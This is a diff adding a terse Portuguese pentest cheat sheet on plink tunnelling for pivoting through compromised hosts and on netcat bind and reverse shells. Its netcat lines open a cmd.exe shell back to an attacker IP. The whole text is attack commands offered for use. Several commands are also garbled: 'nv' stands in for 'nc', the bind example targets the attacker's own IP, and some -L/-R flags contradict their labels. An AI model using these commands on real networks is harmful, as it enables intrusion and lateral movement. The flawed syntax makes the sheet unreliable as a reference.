@@ -1,0 +1,54 @@
+----------------------------------------
+plink - bind e reverse
+----------------------------------------
+bind:
+plink -C -R [ip do pivo rede kali]:[porta escolhida]:[ip do alvo]:[porta do sv alvo] [ip atacante]
+
+reserve:
+plink -C -L [ip do pivo rede alvo]:[porta escolhida]:[ip do kali]:[porta escolhida] [ip kali]
+
+
+
+--------------------------------------------------------------------------------------------------
+Plink - Pivo de Pivo - Bind
+--------------------------------------------------------------------------------------------------
+Kali=K
+Pivo1=P1
+Pivo2=P2
+Alvo=A
+
+Estabelecer um link reverso no P1 na porta 22 do K
+plink -C -L [ip do P1 rede K]:[22]:[ip do K]:22 [ip kali]
+
+Estabelecer um link DIRETO no P2 para A utilizando o link reverso para estabelecer o ctt servidor ssh K
+plink -C -R [ip do P2 rede P1]:[porta escolhida]:[ip do A]:[porta escolhida] [ip do P1 rede K]:[22]
+
+--------------------------------------------------------------------------------------------------
+Plink - Pivo de Pivo - Reverse
+--------------------------------------------------------------------------------------------------
+Kali=K
+Pivo1=P1
+Pivo2=P2
+Alvo=A
+
+Estabelecer um link reverso no P1 na porta 22 do K
+plink -C -L [ip do P1 rede K]:[22]:[ip do K]:22 [ip kali]
+
+
+Estabelecer um link reverso no P1 na porta escolhida
+plink -C -L [ip do P1 rede P2]:[porta escolhida]:[ip do K]:[porta escolhida] [ip kali]
+
+Estabelecer um link reverso no P2 na porta escolhida de P1
+plink -C -L [ip do P2 rede A]:[porta escolhida]:[ip do P1]:[porta escolhida] [ip p1]:[22]
+
+--------------------------------
+Netcat bind e reverse
+--------------------------------
+Bind
+Alvo: nv -lvp [porta] -e cmd.exe
+Atacante: nc -nv [ip atacante] [porta]
+
+
+Reverse
+Atacante: nv -lvp [porta]
+Alvo: nc -nv [ip atacante] [porta] -e cmd.exe
